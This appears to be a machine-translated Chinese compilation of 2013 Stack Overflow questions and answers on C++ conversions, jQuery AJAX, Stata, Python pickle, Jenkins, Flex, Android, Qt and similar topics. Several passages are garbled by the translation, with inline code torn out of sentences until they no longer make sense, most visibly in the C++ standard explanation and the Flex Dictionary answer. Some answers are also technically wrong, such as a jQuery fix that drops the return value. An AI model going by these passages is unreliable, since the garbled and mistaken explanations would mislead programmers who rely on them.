* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:37:22.690

对我来说，这似乎是一个 VC10 错误，**与**`std::string`.

**错误隔离：**

我把它归结为以下示例：

```
#include <string>

class B
{
public:
    B(char const*) { }
    B(B&&) { }
};

class A
{
public:
    operator char* const () { return 0; }
    operator B () { return B(0); }
};

int main()
{
    A a;
    B b1 = a; // fine
    B b2 = A(); // error C2440: 'initializing' : cannot convert from 'A' to 'B'
                // No constructor could take the source type, or constructor
                // overload resolution was ambiguous.
} 
```

类`B`有一个移动构造函数和一个带有`const char*`. 尝试从 初始化`b2`时`rvalue`，VC10 似乎无法选择转换运算符到`B`.

Clang 3.2 和 GCC 4.7.2 都选择转换运算符为`B`.

**C++ 标准规则：**

C++ 标准的第 8.5/16 段规定：

[对于复制初始化的这种情况，] “可以从源类型转换***为目标类型****或（当使用转换函数时）转换为其派生类的用户定义转换序列，如 13.3.1.4 中所述，并且通过重载决议（13.3）选择最好的“*

 **如果我们考虑示例中从源*类型*`A`（) 以到达**目的地类型**。因此，它比使用的用户定义转换函数 to (per 13.3.3.2) 的那一步要长一步，这使得后者更可取。`B``A``char const*`*`B``char const*` **`B``A``B`***

 ***这似乎证实了这是一个 VC10 错误。*****

# java - SWT：透明外壳使小部件也透明

> ID：14379296
> 
> 赞同：1
> 
> 时间：2013-01-17T12:37:35.260
> 
> 标签：java, swt, transparency

使用 SWT，我将外壳透明度设置为`setAlpha(x)`. 但是随后所有的小部件也变得透明了。即使添加“全白”图像作为合成背景也变得透明。所以我实际上不能在这个窗口上做任何事情。

有谁知道如何绕过这个？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T13:45:40.043

您是否有可能正在搜索[这样](http://code.google.com/a/eclipselabs.org/p/opal/wiki/InfiniteProgressPanel)的内容：

![在此处输入图像描述](../Images/9e08ef7d2e0f69a60609584f59c3f0d2.png)

或者[这个](http://code.google.com/a/eclipselabs.org/p/opal/wiki/Panels)：

![在此处输入图像描述](../Images/e9012ab05d26e32e76ca3974b200e86f.png)

两者都是[蛋白石项目](http://code.google.com/a/eclipselabs.org/p/opal/)的一部分。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-17T12:58:14.833

我认为这是 Windows 操作系统上窗口外壳的标准行为。但是您可以通过在 Shell 上设置区域来实现您想要的...

看看这个片段：[http ://www.java2s.com/Code/Java/SWT-JFace-Eclipse/SWTShellcreateanonrectangularwindow.htm](http://www.java2s.com/Code/Java/SWT-JFace-Eclipse/SWTShellcreateanonrectangularwindow.htm)

# jquery - jQuery AJAX - 范围和从成功函数返回数据

> ID：14379299
> 
> 赞同：0
> 
> 时间：2013-01-17T12:37:42.737
> 
> 标签：jquery, ajax

在 JS 范围内遇到一些问题。我知道它不是 AJAX ，因为我已经转为 async:false，但我无法让[jQuery Promise](http://api.jquery.com/promise/)为我工作。我真的无法理解为什么 apiData 会返回未定义。

```
 var url = 'http://www.myjson';      

    /* The API call */
    function getData(url) {

        var text;

        result = $.ajax({
            type: 'GET',
            url: url,
            async: false,
            jsonp: 'callback',
            dataType: 'jsonp',
            success: function(data)
            {
                text = data;
                 //console logging here returns text data fine
                return text;
            }

         });

        return text;
    }
    apiData = getData(url);
    console.log(apiData);

    //returns undefined for apiData 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:50:39.580

跨域请求似乎不允许同步调用。

根据 jQuery 文档：

《跨域请求和dataType：“jsonp”请求不支持同步操作》

[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

我没有测试过，但在你的情况下，可能 async 被更改为“true”，因为你使用 jsonp 作为数据类型。因此，在您尝试读取数据之前，尚未调用 onSuccess 处理程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:41:13.477

像这样试试

```
var url = 'http://www.myjson';      

/* The API call */
function getData(url) {

    var text;

    result = $.ajax({
        type: 'GET',
        url: url,
        async: false,
        jsonp: 'callback',
        dataType: 'json',
        success: function(data)
        {
            text = data;
             //console logging here returns text data fine
            return text;
        }

     });
}
apiData = getData(url);
console.log(apiData);

//returns undefined for apiData 
```

# jquery - 如何检查用户是否输入了错误的html

> ID：14379303
> 
> 赞同：3
> 
> 时间：2013-01-17T12:37:57.217
> 
> 标签：jquery, asp.net, html, asp.net-mvc-3

我有一个页面，其中有一个文本区域，用户可以在其中输入 HTML，还有一个预览按钮，用户可以在其中查看他输入的 html。

我想跟踪他输入的html是否有效。如果无效我会留言

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:40:06.610

将发布的 HTML 加载到[HTML 敏捷包](http://htmlagilitypack.codeplex.com/)中 - 它是一个 HTML 解析器。

如果 HTML 有效，则该`ParseErrors`集合将为空。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:42:12.727

看看[h5Validate](http://ericleads.com/h5validate/)

> jQuery 的最佳实践实时 HTML5 表单验证。适用于所有流行的浏览器，包括 IE6 等旧浏览器。◦ 定期在 13 种不同的浏览器上进行测试，IE6 - IE9、FireFox、Chrome、iPhone 和 Android。◦ 根据 1,000 名用户调查、多项可用性研究和数百万用户在实时生产环境中的行为实施最佳实践。

# macos - OS X, Perl CGI 环境

> ID：14379305
> 
> 赞同：0
> 
> 时间：2013-01-17T12:38:02.643
> 
> 标签：macos, perl, apache, cgi, environment-variables

在 OS X Snow Leopard 上，我使用 perlbrew 运行默认的 Apache。

我的 PATH 指向 perlbrew perl，所以我希望`/usr/bin/env perl`做同样的事情，它从 bash 做，但不是通过 cgi 脚本，这似乎使用系统 perl。

如何让 Apache 使用 perlbrew perl？

# 更新

在 StackOverflow 上回答了这个问题：[$PATH environment variable for apache2 on mac](https://stackoverflow.com/questions/6833939/path-environment-variable-for-apache2-on-mac)

有趣的是，PHP 人认为这是一个有效的问题，但 Perl 人却不这样认为。如果 Perl 人员花几秒钟时间来说明他们为什么认为这个问题与编程和常见问题解答中描述的问题无关，那会很有帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:09:41.047

当您运行 时`/usr/bin/env perl`，它会在您的环境变量中找到`perl`某个`$PATH`位置……该变量设置在您的一个点文件中（可能是`.bash_profile`或`.bashrc`）。

当 Apache 启动时，它通常`launchd`由您的 shell 初始化脚本启动并且不接收任何环境设置服务。您需要修改启动 Apache 的脚本以将必要的目录添加到`$PATH`，或修改您的 CGI 脚本以直接调用适当的`perl`二进制文件（通过使用`#!/path/to/my/perl`而不是`#!/usr/bin/env perl`）。

# r - 为组估计多个回归模型并保存某个参数值

> ID：14379307
> 
> 赞同：0
> 
> 时间：2013-01-17T12:38:09.343
> 
> 标签：r, loops, regression, stata, estimation

我正在寻找一种方法来估计各种模型（假设是 10）并将每个估计中的某个参数值保存在带有 stata 的向量中。

我更像是一个 R 人，这是一个非常简单的 R 代码工作示例

```
n1 <- 100
n2 <- 10
group <- rep(1:10,each=n1)
data <- as.data.frame(cbind(rnorm(n1*n2,0,1),rnorm(n1*n2,0,1),group))
dimnames(data)[[2]] <- c("y","x","group")
val <- names(table(group))
estimates <- vector(mode="numeric",length=length(val))

for( i in 1:length(val)){
j <- which(data$group==val[i])
estimates[i] <- coef(lm(y[j] ~ x[j], data=data))[2]
} 
```

或者

```
library(nlme)
mod1 <- lmList(y~x | group, data=data)
coef(mod1)[,2] 
```

是的，不幸的是我需要使用 stata :-(

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T20:38:49.807

你的最终目标是什么？Stata 和 R 的范式不同，因此了解最终目标会有所帮助。在 RI 中倾向于考虑向量，但不在 Stata 中（向量在 Stata 中并不真正存在）。如果您想要一张桌子，那么我建议您使用`estout`SSC ( `ssc install estout`) 的包。如果只是想以系数本身为目的，那么我建议`statsby`.

```
clear
version 11.2
set seed 2001

* generate your data
set obs 1000
generate y = rnormal()
generate x = rnormal()
generate group = 1 + floor((_n - 1) / 100)

* if you want a table
* you'll need the estout package from SSC (ssc install estout)
eststo clear
forvalues i = 1/10 {
    eststo : regress y x if (group == `i')
}
esttab

* if you just the coefficients
statsby, by(group) clear : regress y x
list 
```

两者`esttab`都有`statsby`很多选项，因此请查看帮助文件。

* * *

更新：您似乎想要按组（这里是公司）进行时间序列测试。在经济学方面，我认为你会想要滚动回归，但这个框架应该让你开始。

```
clear
version 11.2
set seed 2001

* generate your data
set obs 1000
generate y = rnormal()
generate x = rnormal()
generate firm = 1 + floor((_n - 1) / 100)
generate year = 1 + mod((_n - 1), 100)

* regress by firm
xtset firm year
statsby _b, by(firm) saving(temp, replace) : regress y x

* then merge back
merge m:1 firm using temp
list in 1/20 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-18T12:47:13.470

这需要一个多级模型，其中 1 级回归是您的公司级回归，2 级回归是解释组斜率之间可变性的回归。您正在做的事情过于繁琐，无论如何都不会给您正确的标准错误。这是通过 最清楚地实现的`gllamm`，尽管您也可以扭转双手`xtmixed`来做到这一点。

# php - php哈希密码性能

> ID：14379308
> 
> 赞同：2
> 
> 时间：2013-01-17T12:38:10.147
> 
> 标签：php, hash, passwords

我构建了一个 php 哈希系统，但我对脚本的速度性能感到困惑。我为不同数量的请求对脚本进行了基准测试（速度仅适用于脚本，不涉及其他内容）。

10 个请求：0.001 秒

100 个请求：0.011 秒

1000 个请求：0.073 秒

10000 个请求：0.667 秒

100000 个请求：6.776 秒

100万后服务器返回黑屏

我的困惑：

如果 1000 个用户尝试同时登录，每个用户的密码输入需要 0.00001 秒进行散列并与他们的原始密码进行核对，还是每个用户需要 0.073 秒？

benM 这是基准测试的脚本：

```
function test() 
{
  global $result;
  ob_start();
  $x = microtime(true);

  while($i < 10000) 
  {
      print // here you add whatever you want to test;
      ++$i;
  }

  $temp = microtime(true) - $x;
  ob_end_clean();
  return $temp;
}
echo number_format(test(), 3); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:48:59.023

您使用的基准测试脚本并不理想，因为它在单个请求中测试它们。您不必担心这一点，因为 IRL，没有用户会在一个请求中登录 1,000 次！

# python - 用python将列表加载到内存中？或者它已经在记忆中了？

> ID：14379310
> 
> 赞同：0
> 
> 时间：2013-01-17T12:38:14.217
> 
> 标签：python, arrays, list, pickle, stringio

我正在编写一个程序来打开一个用pickle 保存的数据库文件。但是如果我想使用 StringIO/cStringIO 将文件中的列表加载到内存中，它会说：

```
Opening database...
Loading database into memory...
Traceback (most recent call last):
...
  File "C:\myfile.py", line 17 in open_database
    database.write(databasefile)
TypeError: must be string or read-only character buffer, not list 
```

这是我的代码：

```
def open_database(self):
    print("Opening database...")
    databasefile = open('database.dat', "r")
    databasecontent = cPickle.load(databasefile)
    databasefile.close()
    print('Loading database into memory...')
    database = cStringIO.StringIO()
    database.write(databasecontent)
    atexit.register(close_database) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:47:16.117

它已经在记忆中。加载泡菜会返回一个 python 结构。

此外，`StringIO`对象是内存中类似文件的对象，而不是 Python 对象结构。您不能将 python 结构的内存表示并将其“写入”到内存中，而是指示 Python 解释器为您构造这些对象（这是`pickle`模块为您所做的）。

最后但并非最不重要的一点是，您确实应该避免使用`atexit`来关闭文件。Python 退出时仍然打开的文件对象会自动关闭。即使 Python 出于某种原因没有这样做，操作系统也会这样做。

# java - 我可以让詹金斯每小时检查一次 SVN 的变化吗？

> ID：14379314
> 
> 赞同：1
> 
> 时间：2013-01-17T12:38:20.880
> 
> 标签：java, spring, svn, jenkins

我可以让詹金斯每小时检查一次 SVN 的变化吗？我是 Jenkins 的新手，我正在从事一些 Java 项目。我想知道我是否可以让詹金斯每小时醒来，看看项目是否在 SVN 中发生变化。如果项目确实发生了变化，我可以让它进行构建吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:43:27.180

詹金斯不会“醒来”，它会持续运行。但是，您想要的是它定期轮询 SVN。相应地配置 SVN 插件：

-> 你的项目 -> 配置 -> 构建触发器 -> 轮询 scm -> "24 * * * *"

"24 * * * *" 是一个 CRON 表达式，它告诉 Jenkins 每隔 24 分钟每小时轮询一次 SVN。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:40:45.063

是的，使用[这个](https://wiki.jenkins-ci.org/display/JENKINS/Subversion+Plugin)插件

在那[轮询](http://blogs.wandisco.com/2012/01/31/polling-subversion-with-jenkins/)**svn**之后，如图所示

# actionscript-3 - 由 Objects 索引的 Flex 和关联数组

> ID：14379316
> 
> 赞同：1
> 
> 时间：2013-01-17T12:38:23.577
> 
> 标签：actionscript-3, apache-flex, associative-array

**环境：Flex 3.6**

看这段代码：

```
 var arr:Array = new Array()
    var t:Object = {number:"12345", id:"Public"};
    arr[t] = "Hello";

    for (var z:Object in arr)
    {
        if (z is String)
            trace("STRING");
        if (z is Object)
            trace("OBJECT");
        trace("z.number = " + z.number);
    } 
```

输出：

```
STRING
OBJECT 
```

`trace()`然后在最后一次调用时崩溃并出现错误：

```
ReferenceError: Error #1069: Property number not found on String and there is no default value 
```

对象不应该保留字段的名称吗？我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:51:36.783

在对象的`for(var key)`循环中总是. 您可以使用then将是 Object 的类型，并且您的代码将起作用：`Array``key``String``Dictionary``key`

```
 var arr:Dictionary= new Dictionary() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T21:45:14.973

数组的键通常是数字。该行：

```
arr[t] = "Hello"; 
```

可能没有按照您的预期做，因为它正在获取对象 t 并将其转换为字符串以用作数组中的键。它被转换为字符串“[object Object]”的对象。

这段代码有几个问题：

```
for (var z:Object in arr)
{
    if (z is String)
        trace("STRING");
    if (z is Object)
        trace("OBJECT");
    trace("z.number = " + z.number);
} 
```

Z 应该是 String 而不是 Object 类型，但是如果你想查看数组中的每个项目并且你想使用 for each 循环而不是 for 循环。由于数组可以包含不同的类型，z 需要是“*”类型。

最后，无论 z 是什么类型，z.number 的跟踪都在运行，它应该只在 z 是一个对象时运行。（并且还假设数组中的所有对象都具有 number 属性。）

```
arr[0] = "Hello";
arr[1] = t;

for each (var z:* in arr)
{
    if (z is String)
        trace("STRING");

    if (z is Object) {
        trace("OBJECT");
        trace("z.number = " + z.number);
     }
} 
```

# android - 检测匿名/隐身浏览

> ID：14379317
> 
> 赞同：5
> 
> 时间：2013-01-17T12:38:25.480
> 
> 标签：android, browser

Android 默认浏览器允许匿名浏览。是否可以检测用户何时在默认 Android 浏览器应用程序的隐身标签中浏览？（我对用户访问的网址不感兴趣）

我正在使用 Content Observer 对象来接收有关用户浏览历史记录的更新。当用户打开隐身标签时，我没有收到任何更新，正如任何人所期望的那样。我想知道的是我怎么知道用户正在匿名浏览。

我可以知道浏览器应用程序在前台，并且我知道没有注册历史 url，但是我可以检索哪些其他信息来确保用户在隐身标签中浏览？

**更新**：

伙计们，谢谢你的评论。我确切地知道我在问什么。我知道隐身模式的意义，并且只有默认浏览器使用`ContentProvider`来记录浏览历史记录。

我正在编写一个家长控制应用程序，所以如果有人能回答这个问题，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-21T13:48:42.703

可能不是理想的解决方案，但您可以使用键盘。

如果您知道浏览器应用程序在前台，则没有注册历史 url，但正在按下键，则说明发生了一些事情。

也许您可以编写自己的键盘应用程序，并将其与您的家长控制一起发布。如果这不是一个选项：

[如何检测软键盘是否在屏幕上](https://stackoverflow.com/questions/2150078/how-to-check-visibility-of-software-keyboard-in-android)

和

[检测按键是否被按下](https://stackoverflow.com/questions/14217535/android-softkeyboard-onkeydown-up-not-detecting-alternative-keys)

**编辑**

为此，您还可以[检查网络流量](https://stackoverflow.com/questions/5327985/find-how-much-network-traffic-other-android-apps-generate)。如果浏览器在键盘打开的情况下，但没有流量，那么您可能是安全的！

# java - Netbeans 的 Eclipse Web 服务资源管理器的替代方案

> ID：14379318
> 
> 赞同：1
> 
> 时间：2013-01-17T12:38:25.163
> 
> 标签：java, eclipse, web-services, netbeans, jboss

我试图在 Eclipse 中为 netbeans 找到 Web 服务资源管理器的替代方案。我真的很喜欢这个功能，并且想知道 nebeans 中是否有类似的东西。一个浏览器，它接受一个 wsdl 并为您提供一个浏览器窗口来测试您的 web 服务。

编辑：请注意，我正在使用 JBoss。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:14:09.100

我建议您为此尝试 SOAPUI。除了探索之外，它还可以调用/测试和模拟服务。他们也有免费版本。

如果您想在 Eclipse 中使用它，显然还有一个 eclipse 插件。

[http://www.soapui.org/IDE-Plugins/eclipse-plugin.html](http://www.soapui.org/IDE-Plugins/eclipse-plugin.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:44:02.600

与 Eclispe 不完全相同，但用途相似。只需右键单击项目并选择“测试 Web 服务”

![在此处输入图像描述](../Images/fb5d2d88089721cf9e4ca95a72449bfe.png)

![在此处输入图像描述](../Images/61ee139146aee311e2291e8fd3e3ae70.png)

更多详情： [http ://dlc.sun.com.edgesuite.net/javaee5/screencasts/hello-simple-client-glassfish/](http://dlc.sun.com.edgesuite.net/javaee5/screencasts/hello-simple-client-glassfish/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:47:41.773

愿这就是你所需要的。展开项目的 Web 服务节点。右键单击 FlowerService 并选择测试 Web 服务

![在此处输入图像描述](../Images/3141f45b64ca2f44d0c66f154aa9515b.png)

# wolfram-mathematica - Mathematica 模拟 随机模拟

> ID：14379323
> 
> 赞同：1
> 
> 时间：2013-01-17T12:38:53.843
> 
> 标签：wolfram-mathematica

我正在尝试在 Mathematica 中模拟 a 和 b 两部分的突变。我通过以下方式输入遗传漂移（完全随机元素）：

```
p[sim_, 0] = Join[Table[a, {15}], Table[b, {15}]]
p[sim_, t_] := p[sim, t] = RandomChoice[p[sim, t - 1], 30] 
```

这创建了两个由 a 和 b 部分随机组成的表。

我想添加突变，以给定的概率发生，所以我尝试将以下内容附加到我上面的代码中

```
Do[ReplacePart[p, i -> b] && If[RandomReal[] > .2, t], {t, 1, 15}] 
```

因此，如果在 0 和 1 之间随机抽取的数字大于 0.2，则它应该替换原始两个表中的元素 i。

所以我的最终代码看起来像

```
p[sim_, 0] = Join[Table[a, {15}], Table[b, {15}]]
p[sim_, t_] := p[sim, t] = RandomChoice[p[sim, t - 1], 30];
Do[If[RandomReal[] < .2, 
  ReplacePart[p[sim, t], {_} -> RandomChoice[{a, b}]], 
  p[sim, t]], {t, 1, 15}] 
```

但我可以说它不起作用，因为更改 RandomReal 的值必须大于不做任何事情，但我没有收到错误消息。

谁能告诉我出了什么问题？任何帮助将不胜感激！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T15:53:14.433

不确定这是否是您唯一的问题，但 ReplacePart 对 P[] 返回的结果进行操作，但不影响函数本身，即。

```
f[0]={1,2,3}
ReplacePart[f[0],2->42] -> {1,42,3} 
```

但你仍然得到：

```
f[0] -> {1,2,3} 
```

还

```
{_} -> 
```

告诉 ReplacePart 替换每个项目。我不确定你的意图是什么......第一个化身`i->`似乎是有道理的......

# windows - 无法在 Qt Creator 中检索调试输出

> ID：14379325
> 
> 赞同：22
> 
> 时间：2013-01-17T12:38:58.273
> 
> 标签：windows, qt, qt-creator, qdebug

在 Windows 上的 Qt Creator 中，`qDebug()`语句不起作用，并且在输出窗口中出现以下消息：

> 无法检索调试输出。

如何修复？

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2013-01-17T12:38:58.273

如果有多个 Qt Creator 实例处于活动状态，则会出现此问题。要解决此问题，只需关闭 Qt Creator 的所有其他实例，它应该可以工作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-04-25T07:45:29.890

对我来说，我通过简单地关闭使用其他 qt 创建者构建的正在运行的应用程序解决了这个问题。所以没有必要关闭其他 qt 创建者。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-08-13T12:16:18.757

或者您可能正在运行 Sysinternals 的 DebugView 版本，这会导致相同的结果。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-18T07:17:54.540

对我来说，当我有多个应用程序实例而不是 Qt Creator 实例时，会出现此错误消息。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-08-13T09:01:19.803

Well, I had two instances of QtCreator and I could not close one of them. They work together. One workaround for this problem is redirecting your application output messages using `qInstallMessageHandler`.

```
#include "mainwindow.h"

#include <QApplication>

void redirectedOutput(QtMsgType, const QMessageLogContext &, const QString &);
QMutex debugOutMutex;

int main(int argc, char *argv[])
{
    QCoreApplication::setAttribute(Qt::AA_EnableHighDpiScaling);
    QApplication app(argc, argv);

    qInstallMessageHandler(redirectedOutput);

    MainWindow w;
    w.show();

    return app.exec();
}

void redirectedOutput(QtMsgType type, const QMessageLogContext &context, const QString &msg)
{
    debugOutMutex.lock();
    std::cout << QDateTime::currentDateTime().toString("hh.mm.ss.zzz  ").toStdString() <<  msg.toStdString() << std::endl;
    if (type == QtFatalMsg) {
        abort();
    }
    debugOutMutex.unlock();
} 
```

I added a `QMutex` too. If your application is utilizing more than one thread, debug outputs can be mixed.

# c++ - 从函数返回 char*

> ID：14379328
> 
> 赞同：24
> 
> 时间：2013-01-17T12:39:05.977
> 
> 标签：c++

下面是3个功能。main() 按预期打印出来。现在，我猜在 mycharstack() 中，字符串存储在堆栈中，因此当“ch”超出范围时，它应该无法返回字符串。它是如何正常工作的？我猜存储在 mychar() 中的字符串也在堆栈上。它应该正常工作吗？我猜代码中还有其他错误和内存泄漏，如果有请告诉我。我可以用 std::string 做这些更清洁和更容易的事情。但我想了解 char* 发生了什么。

```
#include <iostream>
using namespace std;

char* mychar()
{
    return "Hello";
}

char* mycharstack()
{
    char* ch = "Hello Stack";
    return ch;
}

char* mycharheap()
{
    char* ch = new char;
    ch = "Hello Heap";
    return ch;
}

int main()
{
    cout << "mychar() = " << mychar() << endl;
    cout << "mycharstack() = " << mycharstack() << endl;
    cout << "mycharheap() = " << mycharheap() << endl;

    system("PAUSE");
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-01-17T12:45:52.677

在 C++ 中，字符串处理不同于例如 pascal。

```
char* mycharheap()
{
    char* ch = new char;
    ch = "Hello Heap";
    return ch;
} 
```

这会执行以下操作：

1.  `char* ch = new char;`为 ONE 字符创建内存，并将其分配给变量`ch`
2.  `ch = "Hello Heap";`分配给只读内存的变量`ch`指针，其中包含字节`"Hello Heap\0"`。此外，变量的原始内容`ch`丢失，导致内存泄漏。
3.  `return ch;`返回存储到变量的指针`ch`。

你可能想要的是

```
char* mycharheap()
{
    char* ch = new char[11] /* 11 = len of Hello Heap + 1 char for \0*/;
    strcpy(ch, "Hello Heap");
    return ch;
} 
```

注意`strcpy`-> 你有内存`ch`，它有 11 个字符的空间，你正在用内存的只读部分的字符串填充它。

在这种情况下会有泄漏。您需要在写入后删除内存，例如：

```
char* tempFromHeap = mycharheap();
cout << "mycharheap() = " << tempFromHeap << endl;
delete[] tempFromHeap; 
```

但是，我*强烈*不建议这样做（在被调用者中分配内存并在调用者中删除）。对于这种情况，例如 STL `std::string`，另一种常见且更合理的方法是在调用者中分配，传递给被调用者，后者用结果“填充”内存，然后再次在调用者中释放。

导致未定义行为的原因如下：

```
char* mycharstack()
{
    char[] ch = "Hello Heap"; /* this is a shortcut for char[11] ch; ch[0] = 'H', ch[1] = 'e', ...... */
    return ch;
} 
```

这将使用 bytes 在堆栈上创建数组`"Hello Heap\0"`，然后尝试返回指向该数组的第一个字节的指针（在调用函数时，它可以指向任何东西）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-17T12:54:55.363

> 我猜在 mycharstack() 中，字符串存储在堆栈中，因此当“ch”超出范围时，它应该无法返回字符串。它是如何正常工作的？

字符串文字是指存在于*静态*内存中的数组。我希望你知道三个内存区域：自动内存（又名堆栈）、自由存储（又名堆）和静态内存。堆栈上的那个东西只是一个指针变量，你按值返回指针的值（它存储的地址）。所以一切都很好，除了你应该使用`const char*`指针类型，因为你不允许修改字符串文字所引用的数组。

> 我猜存储在 mychar() 中的字符串也在堆栈上。

字符串（字符数组）存储在静态内存中。`char*`只是一种指针类型，您可以使用它来传递地址。`const`也不见了。

> 我猜代码中还有其他错误和内存泄漏，如果有请告诉我。

泄漏在您的第三个功能中。您只为堆上的一个字符分配内存，并将其地址存储到名为 的变量`ch`中。通过以下分配，您可以用字符串文字的地址覆盖此地址。所以，你正在泄漏内存。

您似乎正在考虑`char*`作为字符串变量的类型。但事实并非如此。它是指向字符或字符序列的指针的类型。指针和它可能指向的字符串是两个不同的东西。您可能应该在这里使用的是 std::string 。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-17T12:47:03.950

首先，如果您使用的是 C++，请使用`std::string`来表示字符串。

现在回答你的问题。`char*`是指向`char`（或 s 数组`char`）的指针。字符串文字（引号中的内容）是数组类型的只读对象`char`，存储在某种只读内存中（既不在堆栈上，也不在堆上）。

作为`char*`一个指针，分配给它会改变指针。因此`mychar()`，`mycharstack()`两者都返回一个指向存储在只读内存中的字符串文字的指针。

`mycharheap()`只是泄漏。`char`您在堆上使用分配一个`new char`，然后忘记它的地址并返回一个指向字符串文字的指针。我猜你的意思是：

```
char* mycharheap() {
  char* ch = new char[strlen("Hello Heap") + 1];
  strcpy(ch, "Hello Heap");
  return ch;
} 
```

尽管如此，要重新迭代，不要`char*`在 C++ 中使用字符串。使用`std::string`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T12:43:28.343

您的代码中没有错误，只是泄露了`char`. 但这很奇怪。

```
char* mycharheap()
{
    char* ch = new char; //creates a pointer that points to a new char in the heap
    ch = "Hello Heap";   //overwrites the pointer with const char - but this cast is legal.
                         //note: pointer to the previous char is lost
    return ch;           //return the pointer to the constant area where "Hello heap" is stored.
                         //no, "Hello heap" is not on the heap.
} 
```

对于“你想要什么：”部分，约塞连比我快。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-17T12:42:57.750

函数`mycharheap()`泄漏：您使指针指向`char`在堆上分配的长度的内存区域，然后修改该指针以指向存储在只读内存中的字符串文字。分配的内存不会被释放。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-10-12T09:08:02.070

下面的示例是当我试图从函数调用中提取信息时出现的一个问题。

```
#include <iostream>
#include <cstring>
using namespace std;

char* Xout(char* message);

int main()
{
const int LEN = 64;
char message[LEN], *x;

cin>>message;

x=Xout(message);
cout<<x;
return 0;
}

char* Xout(char* message)
{
int length=strlen(message);
for(int i = 0; i < length; i++)
{
    message[i] = 'X';
}
return message;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-12-22T20:43:56.897

```
const char* mychar_readonly() {
    // each time it returns the same pointer to char array in Read-Only memory
    return "Hello Read-Only";
}

int main() {
    const char* s1 = mychar_readonly();
    const char* s2 = mychar_readonly();
    // it will print the same addresses
    // e.g s1: 0x100000f87, s2: 0x100000f87
    printf("s1: %p, s2: %p\n", s1, s2);
    return 0;
} 
```

# jquery - jqtransform 不适用于动态添加的字段

> ID：14379334
> 
> 赞同：0
> 
> 时间：2013-01-17T12:39:40.863
> 
> 标签：jquery, jqtransform

我将 jqtransform 用于我的表单字段。当我将动态字段添加到表单时，jqtransform 不会应用于新字段。请查看示例代码，

```
$(function(){

$('form#js_greatdeals_form').jqTransform();

$('#js_greatdeals_form div.jqTransformSelectWrapper ul li a').click(function(){
var value = $(this).parent().index();
      $("#select_cntry").attr('selectedIndex', value);
      var countryiso = $("#select_cntry").val();

        if(countryiso == 1) {
        var content = '<select name="state" id="state"><option value="s1">State1</option><option value="s2">State2</option></select>';
        $('#newselect').html(content);
        $('select#state').jqTransform(); //Newly added
        }
    }); 
}); 
```

我的形式是，

```
<form id="js_greatdeals_form" name="js_greatdeals_form" method="post">
  <select id="select_cntry">
    <option selected="selected">select</option>
    <option value="1">Country1</option>
    <option value="2">Country2</option>
  </select>
  <div id="newselect"></div>
</form> 
```

我尝试了针对问题给出的答案[[](https://stackoverflow.com/questions/4468629/add-new-formelemts-and-transform-it-with-jqtransform)请参阅评论行“新添加”]。但该解决方案也不适用于我。请只做那些需要的。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:49:41.067

打开 jquery.jqtransform.js 文件并找到以下行：

```
/* Fire the onchange event */
if ($select[0].selectedIndex != $(this).attr('index') && $select[0].onchange) {
    $select[0].selectedIndex = $(this).attr('index');
    $select[0].onchange();
 } 
```

现在只需在该行下方添加以下内容：

```
/* Fire the change event */
 if ($select[0].selectedIndex != $(this).attr('index')) {
     $select[0].selectedIndex = $(this).attr('index');
    $($select[0]).trigger('change');
 } 
```

# regex - Notepad++ - 如何在文件中搜索丢失的字符串

> ID：14379335
> 
> 赞同：1
> 
> 时间：2013-01-17T12:39:42.290
> 
> 标签：regex, search, notepad++, missing-data

我有 10 个文件夹的集群，每个文件夹有 1000 个程序文件。我需要在这些文本文件中搜索字符串。所有文件必须以 $O123456.MIN% 开头（123456 带有随机文件名）。我知道如何查找字符串是否存在，但我如何识别字符串是否不存在？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:46:40.960

试试这个正则表达式：

```
(?!(\$O[^\s]+\.MIN%)).* 
```

它匹配除 a 后跟 a 后跟 a 后跟 a 形式`$`之外`O`的`1 or more characters except whitespace`所有`.`字符串`MIN%`

# php - 从某个日期开始按 7 天的间隔对行进行分组

> ID：14379337
> 
> 赞同：2
> 
> 时间：2013-01-17T12:39:44.793
> 
> 标签：php, mysql

有没有办法从 Mysql 中的某个日期开始按 7 天的间隔（日期时间）对行进行分组？

* * *

## 回答 #1

> 赞同：16
> 
